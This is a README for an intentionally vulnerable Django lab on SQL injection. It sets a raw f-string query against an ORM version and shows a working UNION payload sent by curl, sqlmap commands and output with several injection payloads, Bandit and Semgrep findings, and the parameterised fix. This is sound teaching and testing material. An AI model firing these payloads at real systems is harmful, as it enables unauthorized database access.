# Lab 01 — SQL Injection

Companion lab for the blog post
**[SQL Injection: How Attackers Break Your Database and How Django's ORM Stops Them](https://thiagoteixeira.tech/blog/sql-injection-how-attackers-break-your-database-and-how-djangos-orm-stops-them/)**.

| | |
|---|---|
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-89 — Improper Neutralization of Special Elements used in an SQL Command |
| **ASVS** | V5.3.4 — parameterised queries / ORM |
| **Detection** | SAST (Bandit + Semgrep community) · DAST (sqlmap) — no custom rule needed |

> ⚠️ Intentionally vulnerable. Run locally / in the provided Docker stack only. See [SECURITY.md](../../SECURITY.md).

## The two views

| View | File | What it does |
|---|---|---|
| Vulnerable | [`views_vulnerable.py`](views_vulnerable.py) | Builds raw SQL with an f-string: `cursor.execute(f"... LIKE '%{q}%'")` |
| Secure | [`views_secure.py`](views_secure.py) | ORM: `Note.objects.filter(title__icontains=q)` — parameterised |

Both expose the same "search notes by title" feature. The public data lives in
`sqli_note`. The CTF flag lives in a separate table, `sqli_flag`, that the search
feature has no business reading.

## Run it

From the repository root (the folder with `docker-compose.yml`):

```bash
docker compose up -d          # Postgres + Django on http://127.0.0.1:8000 (background)
```

Everything below is `curl` against that stack — no browser needed. Run the `curl`
commands in a POSIX shell (Linux, macOS, WSL, or **Git Bash** on Windows); on
Windows PowerShell use `curl.exe`, not the `curl` alias.

## Test the pair from the command line

The exploit is a `UNION` that reads the off-limits `sqli_flag` table through the
search box. Send it as `q` to the **vulnerable** view and the flag comes back in
the results:

```bash
curl -sG 'http://127.0.0.1:8000/sql-injection/vulnerable/' \
     --data-urlencode "q=' UNION SELECT id, 'x', value FROM sqli_flag -- " \
  | grep -o 'FLAG{[^}]*}' | head -1
# FLAG{sql_injection_via_raw_string_interpolation}
```

Behind the search box the view builds:

```sql
SELECT id, title, body FROM sqli_note WHERE title LIKE '%' UNION SELECT id, 'x', value FROM sqli_flag -- %'
```

The `'%'` closes the intended `LIKE` literal, the `UNION` appends every row of
`sqli_flag`, and `-- ` comments out the trailing `%'`.

Send the **same** payload to the **secure** view and nothing leaks — the ORM
binds it as one literal search string, so it matches no note titles and never
reaches `sqli_flag`:

```bash
curl -sG 'http://127.0.0.1:8000/sql-injection/secure/' \
     --data-urlencode "q=' UNION SELECT id, 'x', value FROM sqli_flag -- " \
  | grep -c 'FLAG{'
# 0
```

Or prove both outcomes in one command — `tests.py` is the runnable proof, not a
screenshot:

```bash
docker compose run --rm web python manage.py test labs.post_01_sql_injection
```

## The fix

Never let user input into the SQL string. Send a constant template with `%s`
placeholders and a separate params list, or (better) stay in the ORM:

```python
Note.objects.filter(title__icontains=q)                       # ORM — preferred
cursor.execute("... WHERE title LIKE %s", [f"%{q}%"])          # raw, parameterised
```

The fix is not mechanical: turning string-built SQL into a parameterised query
means deciding which parts of the string are *data* and lifting them into the
params list — and that judgement is the whole lesson. The scanners below detect
the dangerous construct; the rewrite is yours to make.

## Scanning it

Detection is standard tools first. Two static analysers read the source; sqlmap
attacks the running lab. Every command and every finding below is reproducible
from a clone, and the full unedited runs are committed under
[`scans/`](scans/) so you can read them without booting anything.

### SAST — Bandit and Semgrep community

Bandit and Semgrep are pinned but **not bundled in the lab image** (CI installs
them per-job). Install them on the host — `pip install bandit==1.9.4 semgrep==1.170.0`
— or prefix a command with `docker compose run --rm web sh -c "pip install -q <tool>==<version> && <command>"`.

```bash
bandit labs/post_01_sql_injection/views_vulnerable.py
semgrep scan --config p/django labs/post_01_sql_injection/
```

Both flag the f-string on line 26 of the vulnerable view. Bandit is a heuristic —
it flags any query *assembled* with an f-string / `%` / `.format()` / `+`:

```
>> Issue: [B608:hardcoded_sql_expressions] Possible SQL injection vector through string-based query construction.
   Severity: Medium   Confidence: Medium
   CWE: CWE-89 (https://cwe.mitre.org/data/definitions/89.html)
   Location: labs/post_01_sql_injection/views_vulnerable.py:26:14
```

Semgrep's community rule is **taint-based** — it fires only when it can trace a
path from a request source to the `execute()` sink, so it names the actual flow:

```
python.django.security.injection.sql.sql-injection-using-db-cursor-execute
  User-controlled data from a request is passed to 'execute()'. ... Instead, use
  django's QuerySets, which are built with query parameterization.
  20┆ q = request.GET.get("q", "")
  26┆ f"SELECT id, title, body FROM sqli_note WHERE title LIKE '%{q}%'"
```

Full output: [`scans/bandit.txt`](scans/bandit.txt), [`scans/semgrep.txt`](scans/semgrep.txt).

On `views_secure.py` both report **0 findings** — no SQL string is built, so there
is nothing to flag. The two are complementary: Bandit's heuristic also catches a
built SQL string in a helper with no `request` in scope (the repository/DAO layer),
at the cost of the occasional false positive on constant SQL; Semgrep's taint
tracking is more precise but needs a traceable source. Run both and read the
difference.

### DAST — sqlmap against the booted lab

DAST needs [sqlmap](https://sqlmap.org) (not a project dependency — install it
once with `pipx install sqlmap`, `pip install sqlmap`, or your distro package).
Boot the lab (`docker compose up -d`), then point sqlmap at the vulnerable endpoint.
No raised effort is needed: at its **default** `--level=1 --risk=1`, sqlmap
fingerprints the back-end as PostgreSQL, confirms `?q=1` injectable four ways, and
dumps the flag table the search should never reach:

```bash
sqlmap -u 'http://127.0.0.1:8000/sql-injection/vulnerable/?q=1' \
       -p q --batch --dump -T sqli_flag
```

```
Parameter: q (GET)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: q=1' AND (SELECT (CASE WHEN (1267=1267) THEN NULL ELSE CAST((CHR(89)||CHR(69)||CHR(100)||CHR(107)) AS NUMERIC) END)) IS NULL-- iJxI

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: q=1' AND 7677=CAST(...(SELECT (CASE WHEN (7677=7677) THEN 1 ELSE 0 END))::text... AS NUMERIC)-- XUkB

    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: q=1';SELECT PG_SLEEP(5)--

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: q=1' AND 4539=(SELECT 4539 FROM PG_SLEEP(5))-- hnyv
back-end DBMS: PostgreSQL
Table: sqli_flag
[1 entry]
+----+--------------------------------------------------+
| id | value                                            |
+----+--------------------------------------------------+
| 1  | FLAG{sql_injection_via_raw_string_interpolation} |
+----+--------------------------------------------------+
```

The **same** command against `/sql-injection/secure/` reports *"all tested
parameters do not appear to be injectable"* — the ORM's parameterisation gives
sqlmap nothing to work with. One honest note from the run: the raw-SQL view
returns HTTP 500 on sqlmap's malformed probes (unbalanced quotes become database
syntax errors), which sqlmap logs — a realistic sign of a view executing
attacker-shaped SQL. Full output:
[`scans/sqlmap-vulnerable.txt`](scans/sqlmap-vulnerable.txt),
[`scans/sqlmap-secure.txt`](scans/sqlmap-secure.txt).

### Why no custom rule

SQL injection is old and thoroughly covered: Bandit's `B608` and the Semgrep
community pack both catch it, and sqlmap proves it end to end. Writing a bespoke
Semgrep rule here would be busywork. A custom rule earns its place only on a
genuinely Django-specific pattern the standard tools don't model — mass
assignment, IDOR, privilege escalation — which is where a later lab will ship one
(see [CONTRIBUTING.md](../../CONTRIBUTING.md)). This lab ships none.
